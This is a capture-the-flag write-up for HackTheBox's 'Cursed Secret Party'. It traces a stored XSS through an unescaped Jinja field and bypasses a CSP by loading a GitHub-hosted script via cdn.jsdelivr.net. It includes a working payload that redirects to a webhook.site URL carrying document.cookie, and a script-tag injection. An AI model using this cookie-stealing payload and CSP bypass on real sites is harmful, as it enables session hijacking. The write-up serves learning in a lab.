Cursed Secret Party

# Solution

## 1. Initial analysis

- The challenge starts with a simple HTML form where users can submit their information.  
  ![alt text](image-1.png)
- After submitting the form, the application responds with: `Your request will be reviewed by our team!`.
- This strongly suggests there is a backend “bot” that reviews submitted requests.

Looking into the source code, we find the bot logic in `bot.js`:
```js
const visit = async () => {
    try {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();

		let token = await JWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag });
		await page.setCookie({
			name: 'session',
			value: token,
			domain: '127.0.0.1:1337'
		});

		await page.goto('http://127.0.0.1:1337/admin', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		await page.goto('http://127.0.0.1:1337/admin/delete_all', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		setTimeout(() => {
			browser.close();
		}, 5000);

    } catch(e) {
        console.log(e);
    }
};
```

## 2. Observations

- The bot assigns the flag to a cookie and uses it to access the `/admin` page. Our goal is to retrieve the bot's cookie.
- Since the bot processes the content we submit, an XSS attack seems feasible.

### Endpoint `/api/submit`
```js
router.post('/api/submit', (req, res) => {
    const { halloween_name, email, costume_type, trick_or_treat } = req.body;

    if (halloween_name && email && costume_type && trick_or_treat) {

        return db.party_request_add(halloween_name, email, costume_type, trick_or_treat)
            .then(() => {
                res.send(response('Your request will be reviewed by our team!'));

                bot.visit();
            })
            .catch(() => res.send(response('Something Went Wrong!')));
    }

    return res.status(401).send(response('Please fill out all the required fields!'));
});
```

### Database functions
```js
async party_request_add(halloween_name, email, costume_type, trick_or_treat) {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('INSERT INTO party_requests (halloween_name, email, costume_type, trick_or_treat) VALUES (?, ?, ?, ?)');
				resolve((await stmt.run(halloween_name, email, costume_type, trick_or_treat)));
			} catch(e) {
				reject(e);
			}
		});
	}

	async get_party_requests(){
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('SELECT * FROM party_requests');
				resolve(await stmt.all());
			} catch(e) {
				reject(e);
			}
		});
	}
```

- After submitting the form, the data is stored in the database without sanitization. The `bot.visit()` function is then called, creating a cookie with the flag and accessing the `/admin` page.

### Endpoint `/admin`
```js
router.get('/admin', AuthMiddleware, (req, res) => {
    if (req.user.user_role !== 'admin') {
        return res.status(401).send(response('Unautorized!'));
    }

    return db.get_party_requests()
        .then((data) => {
            res.render('admin.html', { requests: data });
        });
});
```

- The data from the form is retrieved and directly rendered into `admin.html`.

### Vulnerability in `admin.html`

- There is an XSS vulnerability in `{{ request.halloween_name | safe }}`. Explanation:
  - In Flask/Jinja2:
    - `{{ variable }}` → automatically escapes content.
    - `{{ variable | safe }}` → disables escaping, rendering content directly into HTML.

## 3. Exploitation

- Testing various XSS payloads initially failed due to the Content Security Policy (CSP):
```js
app.use(function (req, res, next) {
    res.setHeader(
        "Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'"
    );
    next();
});
```

- However, the CSP allows scripts from `https://cdn.jsdelivr.net`. Conveniently, GitHub files can be served via this CDN using the endpoint `/gh/user/repo@version/file.js`.

### Steps to exploit

1. Create a `pwn.js` file in a GitHub repository:
```js
window.location = 'https://webhook.site/7752b385-e4e8-4daa-a67a-f14dfcd558ce/cookie=' + document.cookie;
```

2. Submit the following payload:
```json
{
  "halloween_name":"<script src='https://cdn.jsdelivr.net/gh/d4ngvn/CTF_WRITEUP@main/HackTheBox/Web/Very%20Easy/Cursed%20Secret%20Party/pwn.js'></script>",
  "email":"admin@gmail.cm",
  "costume_type":"monster",
  "trick_or_treat":"tricks"
}
```

3. Observe the results:
   ![alt text](image-2.png)
   ![alt text](image.png)

4. Decode the flag:
   ![alt text](image-3.png)

